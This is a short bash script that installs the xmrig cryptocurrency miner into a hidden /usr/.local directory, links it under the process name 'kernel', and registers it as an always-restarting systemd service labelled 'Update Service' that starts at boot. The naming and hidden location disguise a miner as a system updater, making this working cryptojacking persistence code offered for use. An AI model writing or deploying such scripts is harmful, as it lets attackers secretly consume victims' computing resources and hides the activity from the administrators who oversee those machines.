#!/bin/bash

# Step 1: Download xmrig from your GitHub
git clone http://github.com/hba/xmrig.git /tmp/xmrig

# Step 2: Move to /usr/.local
sudo mkdir -p /usr/.local
sudo mv /tmp/xmrig /usr/.local

# Step 3: Create symlink named 'kernel'
sudo ln -sf /usr/.local/kernel /usr/local/bin/kernel

# Accept the first argument as the new "pass" value
if [ -n "$1" ]; then
    sed -i 's/"pass": *"[^"]*",/"pass": "'"$1"'",/' /usr/.local/config.json
fi

# Step 4: Create the run script
sudo tee /usr/.local/run.sh > /dev/null << 'EOF'
#!/bin/bash
if ! pidof kernel >/dev/null; then
    nice kernel
else
    echo "kernel updater is already running in the background. Refusing to run another one."
    echo "Run \"killall kernel\" or \"sudo killall kernel\" if you want to remove background miner first."
fi
EOF

# Step 5: Make run script executable
sudo chmod +x /usr/.local/run.sh

# Step 6: Create a systemd service
sudo tee /etc/systemd/system/kernel-updater.service > /dev/null << 'EOF'
[Unit]
Description=Update Service

[Service]
ExecStart=/usr/.local/run.sh
Restart=always
Nice=10

[Install]
WantedBy=multi-user.target
EOF

# Step 7: Reload systemd and enable service
sudo systemctl daemon-reexec
sudo systemctl daemon-reload
sudo systemctl enable --now kernel-updater.service

echo "✅ Setup complete. The miner will auto-start with the name 'kernel'."
